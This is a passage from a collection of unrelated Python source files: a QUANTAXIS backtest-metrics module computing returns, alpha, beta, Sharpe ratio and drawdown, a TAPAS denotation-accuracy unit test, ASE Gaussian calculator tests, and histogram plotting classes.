OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\n\n\"\"\"\nAnalysis Center for Backtest\nwe will give some function\n\"\"\"\nimport math\nimport sys\n\nimport numpy\nimport pandas as pd\n\nfrom QUANTAXIS.QAFetch.QAQuery import QA_fetch_stock_day\nfrom QUANTAXIS.QAUtil import QA_util_log_info, trade_date_sse\n\n\ndef QA_backtest_analysis_backtest(client, code_list, assets_d, account_days, message, total_date, benchmark_data):\n\n    # \u4e3b\u8981\u8981\u4ecemessage_history\u5206\u6790\n    # 1.\u6536\u76ca\u7387\n    # 2.\u80dc\u7387\n    # 3.\u56de\u64a4\n    \"\"\"\n    Annualized Returns: \u7b56\u7565\u5e74\u5316\u6536\u76ca\u7387\u3002\u8868\u793a\u6295\u8d44\u671f\u9650\u4e3a\u4e00\u5e74\u7684\u9884\u671f\u6536\u76ca\u7387\u3002\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u5f0f\u4e3a (\u7b56\u7565\u6700\u7ec8\u4ef7\u503c / \u7b56\u7565\u521d\u59cb\u4ef7\u503c)^(250 / \u56de\u6d4b\u4ea4\u6613\u65e5\u6570\u91cf) - 1\n\n    Alpha\uff1a\u963f\u5c14\u6cd5\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u5f0f\u4e3a (\u7b56\u7565\u5e74\u5316\u6536\u76ca - \u65e0\u98ce\u9669\u6536\u76ca) - beta \u00d7 (\u53c2\u8003\u6807\u51c6\u5e74\u5316\u6536\u76ca - \u65e0\u98ce\u9669\u6536\u76ca)\uff0c\u8fd9\u91cc\u7684\u65e0\u98ce\u9669\u6536\u76ca\u6307\u7684\u662f\u4e2d\u56fd\u56fa\u5b9a\u5229\u7387\u56fd\u503a\u6536\u76ca\u7387\u66f2\u7ebf\u4e0a10\u5e74\u671f\u56fd\u503a\u7684\u5e74\u5316\u5230\u671f\u6536\u76ca\u7387\u3002\n\n    Beta\uff1a\u8d1d\u5854\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u6cd5\u4e3a \u7b56\u7565\u6bcf\u65e5\u6536\u76ca\u4e0e\u53c2\u8003\u6807\u51c6\u6bcf\u65e5\u6536\u76ca\u7684\u534f\u65b9\u5dee / \u53c2\u8003\u6807\u51c6\u6bcf\u65e5\u6536\u76ca\u7684\u65b9\u5dee \u3002\n\n    Sharpe Ratio\uff1a\u590f\u666e\u6bd4\u7387\u3002\u8868\u793a\u6bcf\u627f\u53d7\u4e00\u5355\u4f4d\u603b\u98ce\u9669\uff0c\u4f1a\u4ea7\u751f\u591a\u5c11\u7684\u8d85\u989d\u62a5\u916c\u3002\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u6cd5\u4e3a (\u7b56\u7565\u5e74\u5316\u6536\u76ca\u7387 - \u56de\u6d4b\u8d77\u59cb\u4ea4\u6613\u65e5\u7684\u65e0\u98ce\u9669\u5229\u7387) / \u7b56\u7565\u6536\u76ca\u6ce2\u52a8\u7387 \u3002\n\n    Volatility\uff1a\u7b56\u7565\u6536\u76ca\u6ce2\u52a8\u7387\u3002\u7528\u6765\u6d4b\u91cf\u8d44\u4ea7\u7684\u98ce\u9669\u6027\u3002\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u6cd5\u4e3a \u7b56\u7565\u6bcf\u65e5\u6536\u76ca\u7684\u5e74\u5316\u6807\u51c6\u5dee \u3002\n\n    Information Ratio\uff1a\u4fe1\u606f\u6bd4\u7387\u3002\u8861\u91cf\u8d85\u989d\u98ce\u9669\u5e26\u6765\u7684\u8d85\u989d\u6536\u76ca\u3002\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u6cd5\u4e3a (\u7b56\u7565\u6bcf\u65e5\u6536\u76ca - \u53c2\u8003\u6807\u51c6\u6bcf\u65e5\u6536\u76ca)\u7684\u5e74\u5316\u5747\u503c / \u5e74\u5316\u6807\u51c6\u5dee \u3002\n\n    Max Drawdown\uff1a\u6700\u5927\u56de\u64a4\u3002\u63cf\u8ff0\u7b56\u7565\u53ef\u80fd\u51fa\u73b0\u7684\u6700\u7cdf\u7cd5\u7684\u60c5\u51b5\u3002\n    \u5177\u4f53\u8ba1\u7b97\u65b9\u6cd5\u4e3a max(1 - \u7b56\u7565\u5f53\u65e5\u4ef7\u503c / \u5f53\u65e5\u4e4b\u524d\u865a\u62df\u8d26\u6237\u6700\u9ad8\u4ef7\u503c)\n\n\n    \u5355\u6b21\u4ea4\u6613\u6536\u76ca\n    \u6536\u76ca/\u6b21\u6570\u7684\u9891\u6b21\u76f4\u65b9\u56fe\n    \u5355\u65e5\u6700\u5927\u6301\u4ed3\n    \"\"\"\n    # \u6570\u636e\u68c0\u67e5\n    if (len(benchmark_data)) < 1:\n        QA_util_log_info('Wrong with benchmark data ! ')\n        sys.exit()\n\n    # \u8ba1\u7b97\u4e00\u4e2abenchmark\n    # \u8fd9\u4e2abenchmark \u662f\u5728\u5f00\u59cb\u7684\u90a3\u5929 \u5e02\u4ef7\u4e70\u5165\u548c\u7b56\u7565\u6240\u9009\u6807\u7684\u4e00\u81f4\u7684\u6240\u6709\u80a1\u7968,\u7136\u540e\u4e00\u76f4\u6301\u4ed3\n    data = pd.concat([pd.DataFrame(message['body']['account']['history'],\n                                   columns=['time', 'code', 'price', 'towards', 'amount', 'order_id', 'trade_id', 'commission']),\n                      pd.DataFrame(message['body']['account']['assets'], columns=['assets'])], axis=1)\n    data['time'] = pd.to_datetime(data['time'], utc=False)\n    data.set_index('time', drop=False, inplace=True)\n\n    trade_history = message['body']['account']['history']\n    cash = message['body']['account']['cash']\n    assets = message['body']['account']['assets']\n\n    #assets_= data.resample('D').last().dropna()\n    # \u8ba1\u7b97\u4ea4\u6613\u65e5\n    trade_date = account_days\n    # benchmark\u8d44\u4ea7\n    benchmark_assets = QA_backtest_calc_benchmark(\n        benchmark_data, assets[0])\n    # d2=pd.concat([data.resample('D').last(),pd.DataFrame(benchmark_assets,columns=['benchmark'])])\n    # benchmark\u5e74\u5316\u6536\u76ca\n    benchmark_annualized_returns = QA_backtest_calc_profit_per_year(\n        benchmark_assets, len(total_date))\n    # \u8ba1\u7b97\u8d26\u6237\u7684\u6536\u76ca\n\n    # days=len(assest_history)-1\n    # \u7b56\u7565\u5e74\u5316\u6536\u76ca\n    annualized_returns = QA_backtest_calc_profit_per_year(\n        assets_d, len(total_date))\n\n    # \u6536\u76ca\u77e9\u9635\n    assest_profit = QA_backtest_calc_profit_matrix(assets)\n    benchmark_profit = QA_backtest_calc_profit_matrix(benchmark_assets)\n\n    # \u7b56\u7565\u65e5\u6536\u76ca\n    profit_day = QA_backtest_calc_profit_matrix(assets_d)\n    # \u80dc\u7387\n    win_rate = QA_backtest_calc_win_rate(assest_profit)\n    # \u65e5\u80dc\u7387\n    win_rate_day = QA_backtest_calc_win_rate(profit_day)\n    # \u5e74\u5316\u6ce2\u52a8\u7387\n    volatility_year = QA_backtest_calc_volatility(profit_day)\n    benchmark_volatility_year = QA_backtest_calc_volatility(benchmark_profit)\n    # \u590f\u666e\u6bd4\u7387\n    sharpe = QA_backtest_calc_sharpe(\n        annualized_returns, 0.05, volatility_year)\n\n    # \u6700\u5927\u56de\u64a4\n    max_drop = QA_backtest_calc_dropback_max(assets_d)\n\n    # \u8ba1\u7b97beta\n    beta = QA_backtest_calc_beta(profit_day, benchmark_profit)\n    # \u8ba1\u7b97Alpha\n    alpha = QA_backtest_calc_alpha(\n        annualized_returns, benchmark_annualized_returns, beta, 0.05)\n    message = {\n        'code': code_list,\n        'annualized_returns': annualized_returns,\n        'benchmark_annualized_returns': benchmark_annualized_returns,\n        'assets': assets_d[1:],\n        'benchmark_assets': benchmark_assets[1:],\n        'vol': volatility_year,\n        'benchmark_vol': benchmark_volatility_year,\n        'sharpe': sharpe,\n        'alpha': alpha,\n        'beta': beta,\n        'total_date': total_date,\n        'trade_date': trade_date,\n        'max_drop': max_drop,\n        'win_rate': win_rate}\n    return message\n\n\ndef QA_backtest_calc_assets(trade_history, assets):\n    assets_d = []\n    trade_date = []\n    for i in range(0, len(trade_history), 1):\n        if trade_history[i][0] not in trade_date:\n            trade_date.append(trade_history[i][0])\n            assets_d.append(assets[i])\n        else:\n            assets_d.pop(-1)\n            assets_d.append(assets[i])\n\n    return assets_d\n\n\ndef QA_backtest_calc_benchmark(benchmark_data, init_assets):\n\n    return list(benchmark_data['close'] / float(benchmark_data['open'][0]) * float(init_assets))\n\n\ndef QA_backtest_calc_alpha(annualized_returns, benchmark_annualized_returns, beta, r):\n\n    alpha = (annualized_returns - r) - (beta) * \\\n        (benchmark_annualized_returns - r)\n    return alpha\n\n\ndef QA_backtest_calc_beta(assest_profit, benchmark_profit):\n    if len(assest_profit) < len(benchmark_profit):\n        for i in range(0, len(benchmark_profit) - len(assest_profit), 1):\n            assest_profit.append(0)\n    elif len(assest_profit) > len(benchmark_profit):\n        for i in range(0, len(assest_profit) - len(benchmark_profit), 1):\n            benchmark_profit.append(0)\n    calc_cov = numpy.cov(assest_profit, benchmark_profit)\n    beta = calc_cov[0, 1] / calc_cov[1, 1]\n    return beta\n\n\ndef QA_backtest_calc_profit(assest_history):\n    return (assest_history[-1] / assest_history[1]) - 1\n\n\ndef QA_backtest_calc_profit_per_year(assest_history, days):\n    return math.pow(float(assest_history[-1]) / float(assest_history[0]), 250.0 / float(days)) - 1.0\n\n\ndef QA_backtest_calc_profit_matrix(assest_history):\n    assest_profit = []\n    if len(assest_history) > 1:\n        assest_profit = [assest_history[i + 1] / assest_history[i] -\n                         1.0 for i in range(len(assest_history) - 1)]\n    return assest_profit\n\n\ndef QA_backtest_calc_volatility(assest_profit_matrix):\n    # \u7b56\u7565\u6bcf\u65e5\u6536\u76ca\u7684\u5e74\u5316\u6807\u51c6\u5dee\n    assest_profit = assest_profit_matrix\n\n    volatility_day = numpy.std(assest_profit)\n    volatility_year = volatility_day * math.sqrt(250)\n    return volatility_year\n\n\ndef QA_backtest_calc_dropback_max(history):\n    drops = []\n    for i in range(1, len(history), 1):\n        maxs = max(history[:i])\n        cur = history[i - 1]\n        drop = 1 - cur / maxs\n        drops.append(drop)\n    max_drop = max(drops)\n    return max_drop\n\n\ndef QA_backtest_calc_sharpe(annualized_returns, r, volatility_year):\n    '\u8ba1\u7b97\u590f\u666e\u6bd4\u7387'\n    return (annualized_returns - r) / volatility_year\n\n\ndef QA_backtest_calc_trade_date(history):\n    '\u8ba1\u7b97\u4ea4\u6613\u65e5\u671f'\n    trade_date = []\n\n    # trade_date_sse.index(history[-1][0])-trade_date_sse.index(history[0][0])\n    for i in range(0, len(history), 1):\n        if history[i][0] not in trade_date:\n            trade_date.append(history[i][0])\n    return trade_date\n\n\ndef calc_trade_time(history):\n    return len(history)\n\n\ndef calc_every_pnl(detail):\n    pass\n\n\ndef QA_backtest_calc_win_rate(profit_day):\n    # \u5927\u4e8e0\u7684\u6b21\u6570\n    abovez = 0\n    belowz = 0\n    for i in range(0, len(profit_day) - 1, 1):\n        if profit_day[i] > 0:\n            abovez = abovez + 1\n        elif profit_day[i] < 0:\n            belowz = belowz + 1\n    if belowz == 0:\n        belowz = 1\n    if abovez == 0:\n        abovez = 1\n    win_rate = abovez / (abovez + belowz)\n    return win_rate\n", "34": "# coding=utf-8\n# Copyright 2019 The Google AI Language Team Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# Lint as: python3\n\nimport csv\nimport os\nimport pickle\nimport tempfile\n\nfrom absl.testing import absltest\nfrom absl.testing import parameterized\nimport pandas as pd\nfrom tapas.scripts import calc_metrics_utils\nfrom tapas.scripts import prediction_utils\nimport tensorflow.compat.v1 as tf\n\n\ndef _read_data_examples(data_path):\n  \"\"\"Reads examples from a dataset csv file.\"\"\"\n  data_examples = {}\n  with tf.io.gfile.GFile(data_path, mode='r') as f:\n    reader = csv.DictReader(f, delimiter='\\t')\n    for row in reader:\n      ex_id = '{}-{}_{}'.format(row['id'], row['annotator'], row['position'])\n      question = row['question'].strip()\n      table_id = row['table_file']\n      gold_cell_coo = prediction_utils.parse_coordinates(\n          row['answer_coordinates'])\n      gold_agg_function = int(row['aggregation'])\n      float_answer_raw = row['float_answer']\n      float_answer = float(float_answer_raw) if float_answer_raw else None\n      ex = calc_metrics_utils.Example(\n          ex_id,\n          question,\n          table_id,\n          None,\n          gold_cell_coo,\n          gold_agg_function,\n          float_answer,\n          has_gold_answer=True,\n          weight=0.5)\n      data_examples[ex_id] = ex\n  return data_examples\n\n\ndef _read_and_store_tables(tables_path, output_tables_file, tables_to_store):\n  \"\"\"Stores multiple tables as a dict of dataframes, for fast access.\n\n  Args:\n    tables_path: The path where all tables csv files are stored.\n    output_tables_file: The file where all the data will be stored as a pickle\n      dict.\n    tables_to_store: A list of table ids to store in the output file.\n  \"\"\"\n  all_tables = {}\n  for f in tables_to_store:\n    with tf.io.gfile.GFile(os.path.join(tables_path, f), mode='r') as f_table:\n      table = pd.read_csv(f_table)\n    all_tables[f] = table\n  with tf.io.gfile.GFile(output_tables_file, 'wb') as f_out:\n    pickle.dump(all_tables, f_out)\n\n\ndef _calc_denotation_accuracy(tables_file, examples, denotation_errors_path,\n                              predictions_file_name):\n  return _calc_weighted_denotation_accuracy(\n      tables_file,\n      examples,\n      denotation_errors_path,\n      predictions_file_name,\n      add_weights=False)['denotation_accuracy']\n\n\ndef _calc_weighted_denotation_accuracy(tables_file, examples,\n                                       denotation_errors_path,\n                                       predictions_file_name, add_weights):\n  with tf.io.gfile.GFile(tables_file, 'rb') as f:\n    tables = pickle.load(f)\n  for example in examples.values():\n    example.table = tables[example.table_id]\n  return calc_metrics_utils.calc_weighted_denotation_accuracy(\n      examples, denotation_errors_path, predictions_file_name, add_weights)\n\n\ndef _write_predictions(data,\n                       headers=('id', 'annotator', 'position',\n                                'answer_coordinates', 'gold_aggr',\n                                'pred_aggr')):\n  predictions_df = pd.DataFrame(columns=headers, data=data)\n  predictions_path = tempfile.mktemp(prefix='predictions_')\n  with tf.io.gfile.GFile(predictions_path, 'w') as f:\n    predictions_df.to_csv(f, sep='\\t', index=False)\n  return predictions_path\n\n\ndef _write_synthetic_predictions():\n  predictions = [['dev-0', '0', '0', '[\"(2, 1)\", \"(2, 2)\"]', '0', '0'],\n                 ['dev-1', '0', '0', '[\"(1, 2)\", \"(1, 4)\"]', '1', '0'],\n                 ['dev-2', '0', '0', '[\"(6, 1)\"]', '3', '0'],\n                 ['dev-3', '0', '0', '[\"(0, 4)\", \"(1, 4)\"]', '2', '2'],\n                 ['dev-4', '0', '0', '[\"(0, 4)\", \"(1, 4)\"]', '1', '1']]\n  return _write_predictions(predictions)\n\n\ndef _write_table(test_tmpdir, headers, data):\n  table_df = pd.DataFrame(columns=headers, data=data)\n  table_path = tempfile.mktemp(prefix='table_', dir=test_tmpdir)\n  table_name = os.path.basename(table_path)\n  with tf.io.gfile.GFile(table_path, 'w') as f:\n    table_df.to_csv(f, index=False)\n  return table_name\n\n\ndef _write_synthetic_table(test_tmpdir):\n  headers = [\n      'Home team', 'Home team score', 'Away team', 'Away team score', 'Venue',\n      'Crowd', 'Date'\n  ]\n  data = [[\n      'St Kilda', '8.15', 'South Melbourne', '7.13', 'Junction Oval',\n      '\"22,000\"', '14 May 1927'\n  ],\n          [\n              'Footscray', '10.18', 'Hawthorn', '7.10', 'Western Oval',\n              '\"11,000\"', '14 May 1927'\n          ],\n          [\n              'Collingwood', '6.13', 'Richmond', '7.13', 'Victoria Park',\n              '\"20,000\"', '14 May 1927'\n          ],\n          [\n              'Carlton', '7.5', 'Essendon', '4.12', 'Princes Park', '\"27,000\"',\n              '14 May 1927'\n          ],\n          [\n              'North Melbourne', '8.5', 'Geelong', '7.13', 'Arden Street Oval',\n              '\"20,000\"', '14 May 1927'\n          ],\n          [\n              'Melbourne', '13.15', 'Fitzroy', '8.11', 'MCG', '\"14,931\"',\n              '14 May 1927'\n          ], ['total_count', '6', '6', '6', '6', '6', '-']]\n  return _write_table(test_tmpdir, headers, data)\n\n\ndef _write_tables_dict(headers=None, data=None):\n  test_tmpdir = tempfile.mkdtemp()\n  if headers is None and data is None:\n    table_name = _write_synthetic_table(test_tmpdir)\n  else:\n    table_name = _write_table(test_tmpdir, headers, data)\n  output_tables_file = tempfile.mktemp(\n      prefix='output_tables_file_', dir=test_tmpdir)\n  _read_and_store_tables(test_tmpdir, output_tables_file, [table_name])\n  return test_tmpdir, output_tables_file, table_name\n\n\ndef _write_dataset(dataset):\n  headers = [\n      'id',\n      'annotator',\n      'position',\n      'question',\n      'table_file',\n      'answer_coordinates',\n      'answer_text',\n      'aggregation',\n      'float_answer',\n      'column_scores',\n  ]\n  dataset_df = pd.DataFrame(columns=headers, data=dataset)\n  data_path = tempfile.mktemp(prefix='examples_')\n  with tf.io.gfile.GFile(data_path, 'w') as f:\n    dataset_df.to_csv(f, sep='\\t', index=False)\n  return data_path\n\n\ndef _write_synthetic_dataset(table_name):\n  dataset = ([\n      [\n          'dev-0', '0', '0', '-', table_name, '[\"(2, 1)\", \"(2, 2)\"]', '[\"-\"]',\n          calc_metrics_utils._Answer.NONE, '', 1.0\n      ],\n      [\n          'dev-1', '0', '0', '-', table_name, '[\"(1, 2)\", \"(1, 3)\", \"(1,4)\"]',\n          '[\"-\"]', calc_metrics_utils._Answer.SUM, '', 1.0\n      ],\n      [\n          'dev-2', '0', '0', '-', table_name,\n          '[\"(0, 0)\",\"(0, 1)\",\"(0, 2)\",\"(0, 3)\",\"(0, 4)\",\"(0, 5)\"]', '[\"-\"]',\n          calc_metrics_utils._Answer.COUNT, '', 1.0\n      ],\n      [\n          'dev-3', '0', '0', '-', table_name, '[\"(0, 4)\",\"(1, 4)\"]', '[\"-\"]',\n          calc_metrics_utils._Answer.AVERAGE, '', 1.0\n      ],\n      [\n          'dev-4', '0', '0', '-', table_name, '[\"(0, 4)\",\"(1, 4)\"]', '[\"-\"]',\n          calc_metrics_utils._Answer.SUM, '', 1.0\n      ],\n  ])\n  return _write_dataset(dataset)\n\n\nclass CalcMetricsTest(parameterized.TestCase):\n\n  def test_create_tables_dict(self):\n    _, output_tables_file, table_name = _write_tables_dict()\n    with tf.io.gfile.GFile(output_tables_file, 'rb') as f:\n      tables = pickle.load(f)\n      assert table_name in tables\n\n  def test_read_data_examples(self):\n    data_path = _write_synthetic_dataset('table_1')\n    examples = _read_data_examples(data_path)\n    self.assertEqual(examples['dev-2-0_0'].gold_cell_coo,\n                     set([(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5)]))\n\n  def test_read_predictions(self):\n    data_path = _write_synthetic_dataset('table_1')\n    examples = _read_data_examples(data_path)\n    predictions_path = _write_synthetic_predictions()\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    self.assertEqual(examples['dev-2-0_0'].gold_agg_function,\n                     calc_metrics_utils._Answer.COUNT)\n    self.assertEqual(examples['dev-2-0_0'].pred_agg_function,\n                     calc_metrics_utils._Answer.NONE)\n\n  def test_calc_structure_metrics(self):\n    data_path = _write_synthetic_dataset('table_1')\n    examples = _read_data_examples(data_path)\n    predictions_path = _write_synthetic_predictions()\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    test_tmpdir = tempfile.mkdtemp()\n    results = calc_metrics_utils.calc_structure_metrics(\n        examples, denotation_errors_path=test_tmpdir)\n    self.assertEqual(results.aggregation_acc, 0.6)\n    self.assertEqual(results.cell_acc, 0.6)\n    self.assertEqual(results.joint_acc, 0.6)\n\n    denotation_errors = pd.read_csv(\n        os.path.join(test_tmpdir, 'structured_examples.tsv'), sep='\\t')\n    self.assertEqual(denotation_errors.iloc[0, 1], 'dev-0-0_0')\n    self.assertEqual(denotation_errors.iloc[0, 2],\n                     calc_metrics_utils._Answer.NONE)\n    self.assertEqual(denotation_errors.iloc[0, 3],\n                     calc_metrics_utils._Answer.NONE)\n\n  def test_denotation_accuracy(self):\n    test_tmpdir, output_tables_file, table_name = _write_tables_dict()\n    data_path = _write_synthetic_dataset(table_name)\n    examples = _read_data_examples(data_path)\n    predictions_path = _write_synthetic_predictions()\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    predictions_file_name = 'predictions'\n    denotation_accuracy = _calc_denotation_accuracy(\n        output_tables_file,\n        examples,\n        denotation_errors_path=test_tmpdir,\n        predictions_file_name=predictions_file_name,\n    )\n    self.assertEqual(denotation_accuracy, 0.8)\n\n    denotation_errors = pd.read_csv(\n        os.path.join(test_tmpdir,\n                     'denotation_examples_{}'.format(predictions_file_name)),\n        sep='\\t')\n    self.assertEqual(denotation_errors.iloc[0, 1], 'dev-0-0_0')\n    self.assertEqual(denotation_errors.iloc[0, 2], '-')\n    self.assertEqual(denotation_errors.iloc[0, 5], \"['6.13', 'Richmond']\")\n    self.assertEqual(denotation_errors.iloc[0, 7], '[(2, 1), (2, 2)]')\n\n  def test_weighted_denotation_accuracy(self):\n    test_tmpdir, output_tables_file, table_name = _write_tables_dict()\n    data_path = _write_synthetic_dataset(table_name)\n    examples = _read_data_examples(data_path)\n    predictions_path = _write_synthetic_predictions()\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    predictions_file_name = 'predictions'\n    stats = _calc_weighted_denotation_accuracy(\n        output_tables_file,\n        examples,\n        denotation_errors_path=test_tmpdir,\n        predictions_file_name=predictions_file_name,\n        add_weights=True,\n    )\n    self.assertEqual(stats['denotation_accuracy'], 0.8)\n    self.assertEqual(stats['weighted_denotation_accuracy'], 0.5)\n\n  def test_calc_denotation_accuracy_handles_nans(self):\n    test_tmpdir, output_tables_file, table_name = _write_tables_dict()\n    data_path = _write_dataset([[\n        'dev-0', '0', '0', '-', table_name, '[]', '[]',\n        calc_metrics_utils._Answer.SUM, 'NAN', 0.5\n    ]])\n    examples = _read_data_examples(data_path)\n    predictions_path = _write_predictions(\n        data=[['dev-0', '0', '0', '[]', '0', '1']])\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    denotation_accuracy = _calc_denotation_accuracy(\n        output_tables_file,\n        examples,\n        denotation_errors_path=test_tmpdir,\n        predictions_file_name='predictions',\n    )\n    self.assertEqual(1.0, denotation_accuracy)\n\n  def test_calc_denotation_accuracy_handles_low_precision_floats(self):\n    test_tmpdir, output_tables_file, table_name = _write_tables_dict(\n        headers=['FLOAT'], data=[['992.39']])\n    data_path = _write_dataset([[\n        'dev-0', '0', '0', '-', table_name, '[]', '[]',\n        calc_metrics_utils._Answer.NONE, '992.3900146484375', 0.5\n    ]])\n    examples = _read_data_examples(data_path)\n    predictions_path = _write_predictions(\n        data=[['dev-0', '0', '0', '[\"(0, 0)\"]', '0', '0']])\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    denotation_accuracy = _calc_denotation_accuracy(\n        output_tables_file,\n        examples,\n        denotation_errors_path=test_tmpdir,\n        predictions_file_name='predictions',\n    )\n    self.assertEqual(1.0, denotation_accuracy)\n\n  def test_calc_denotation_accuracy_without_gold_answer(self):\n    table = pd.DataFrame([['a', 'b'], ['0', '1']], columns=['A', 'B'])\n    denotation_accuracy = calc_metrics_utils.calc_denotation_accuracy(\n        examples={\n            '0':\n                calc_metrics_utils.Example(\n                    example_id='0',\n                    question='q',\n                    table_id='tab_0',\n                    table=table,\n                    gold_cell_coo=set(),\n                    gold_agg_function=calc_metrics_utils._Answer.NONE,\n                    float_answer=None,\n                    has_gold_answer=False,\n                ),\n            '1':\n                calc_metrics_utils.Example(\n                    example_id='1',\n                    question='q',\n                    table_id='tab_0',\n                    table=table,\n                    gold_cell_coo={(0, 0)},\n                    gold_agg_function=calc_metrics_utils._Answer.NONE,\n                    float_answer=None,\n                    has_gold_answer=True,\n                    pred_cell_coo={(0, 0)},\n                )\n        },\n        denotation_errors_path=None,\n        predictions_file_name=None)\n    self.assertEqual(0.5, denotation_accuracy)\n\n  def test_read_predictions_without_pred_aggr(self):\n    predictions_path = _write_predictions(\n        data=[['dev-0', '0', '0', '[\"(0,0)\"]']],\n        headers=('id', 'annotator', 'position', 'answer_coordinates'))\n    examples = {\n        'dev-0-0_0':\n            calc_metrics_utils.Example(\n                example_id='dev-0-0_0',\n                question='q',\n                table_id='tab_0',\n                table=pd.DataFrame(),\n                gold_cell_coo={},\n                gold_agg_function=calc_metrics_utils._Answer.NONE,\n                float_answer=None,\n                has_gold_answer=True,\n            )\n    }\n    calc_metrics_utils.read_predictions(predictions_path, examples)\n    self.assertLen(examples, 1)\n    self.assertEqual(\n        next(iter(examples.values())).pred_agg_function,\n        calc_metrics_utils._Answer.NONE)\n\n\nif __name__ == '__main__':\n  absltest.main()\n", "35": "import pytest\nfrom ase import Atoms\nfrom ase.io import read\nfrom ase.calculators.gaussian import Gaussian, GaussianOptimizer, GaussianIRC\nfrom ase.optimize import LBFGS\n\n\n@pytest.fixture\ndef atoms():\n    return Atoms('CHO',\n                 [[0.0, 0.0, 0.0],\n                  [0.0, 0.0, 1.35],\n                  [1.178513, 0.0, -0.416662]],\n                 magmoms=[0.5, 0.0, 0.5])\n\n\ndef get_calc(**kwargs):\n    kwargs.update(mem='100MW', method='hf', basis='sto-3g')\n    return Gaussian(**kwargs)\n\n\ndef test_optimizer(atoms):\n    pos = atoms.positions.copy()\n    atoms.calc = get_calc(label='opt', scf='qc')\n    opt_gauss = GaussianOptimizer(atoms)\n    opt_gauss.run(fmax='tight')\n    e_gaussopt = read('opt.log', index=-1).get_potential_energy()\n\n    atoms.positions[:] = pos\n    atoms.calc.set_label('sp')\n    with LBFGS(atoms) as opt_ase:\n        opt_ase.run(fmax=1e-2)\n    e_aseopt = atoms.get_potential_energy()\n    assert e_gaussopt - e_aseopt == pytest.approx(0., abs=1e-3)\n\n\ndef test_irc(atoms):\n    calc_ts = get_calc(label='ts', chk='ts.chk')\n    ts = GaussianOptimizer(atoms, calc_ts)\n    ts.run(opt='calcall,ts,noeigentest')\n    tspos = atoms.positions.copy()\n\n    atoms.calc = get_calc(label='sp', chk='sp.chk', freq='')\n    e_ts = atoms.get_potential_energy()\n\n    calc_irc_for = get_calc(label='irc_for', oldchk='sp', chk='irc_for.chk')\n    irc_for = GaussianIRC(atoms, calc_irc_for)\n    irc_for.run(direction='forward', irc='rcfc')\n    e_for = read('irc_for.log', index=-1).get_potential_energy()\n\n    atoms.positions[:] = tspos\n    calc_irc_rev = get_calc(label='irc_rev', oldchk='sp', chk='irc_rev.chk')\n    irc_rev = GaussianIRC(atoms, calc_irc_rev)\n    irc_rev.run(direction='reverse', irc='rcfc')\n    e_rev = read('irc_rev.log', index=-1).get_potential_energy()\n\n    assert e_ts - e_for == pytest.approx(1.282, abs=1e-3)\n    assert e_ts - e_rev == pytest.approx(0.201, abs=1e-3)\n", "36": "from __future__ import absolute_import, print_function, division\nfrom .base_classes import Element\nfrom . import parts\n\n\nclass ClassicHisto(Element):\n    name = 'ClassicHisto'\n\n    def __init__(self,\n                 n_bins=50,\n                 y_label='Frequence',\n                 log_y=False,\n                 binning_dict=None):\n        print(binning_dict)\n        super(ClassicHisto, self).__init__()\n        self.calc_components.append(parts.CalcBinning(\n            n_bins=n_bins,\n            binning_dict=binning_dict))\n        self.calc_components.append(parts.CalcHistogram())\n        self.calc_components.append(parts.CalcClassicHistoErrors())\n        plot_hist = parts.PlotHistClassic(log_y=log_y,\n                                          y_label=y_label)\n        self.plot_components.append(plot_hist)\n\n\nclass ClassicRatio(Element):\n    name = 'ClassicRatio'\n\n    def __init__(self,\n                 n_bins=50,\n                 y_label=r'$\\frac{\\mathrm{Test - Ref}}{\\sigma}$',\n                 y_lims=None,\n                 binning_dict=None):\n        super(ClassicRatio, self).__init__()\n        self.calc_components.append(parts.CalcBinning(\n            n_bins=n_bins,\n            binning_dict=binning_dict))\n        self.calc_components.append(parts.CalcHistogram())\n        self.calc_components.append(parts.CalcClassicHistoErrors())\n        plot_ratio = parts.PlotRatioClassic(y_lims=y_lims,\n                                            y_label=y_label)\n        self.plot_components.append(plot_ratio)\n\n\nclass AggarwalHisto(Element):\n    name = 'AggarwalHisto'\n\n    def __init__(self,\n                 n_bins=50,\n                 y_label='Frequence',\n                 log_y=False,\n                 alpha=[0.68, 0.9, 0.99],\n                 bands=False,\n                 band_borders=True,\n                 band_brighten=True,\n                 band_alpha=0.5,\n                 binning_dict=None):\n        super(AggarwalHisto, self).__init__()\n        self.calc_components.append(parts.CalcBinning(\n            n_bins=n_bins,\n            binning_dict=binning_dict))\n        self.calc_components.append(parts.CalcHistogram())\n        self.calc_components.append(parts.CalcAggarwalHistoErrors(alpha))\n        plot_hist = parts.PlotHistAggerwal(log_y=log_y,\n                                           bands=bands,\n                                           band_borders=band_borders,\n                                           band_brighten=band_brighten,\n                                           band_alpha=band_alpha,\n                                           y_label=y_label)\n        self.plot_components.append(plot_hist)\n\n\nclass LimitedMCHisto(Element):\n    name = 'LimitedMCHisto'\n\n    def __init__(self,\n                 n_bins=50,\n                 y_label='Frequence',\n                 log_y=False,\n                 alpha=[0.68, 0.9, 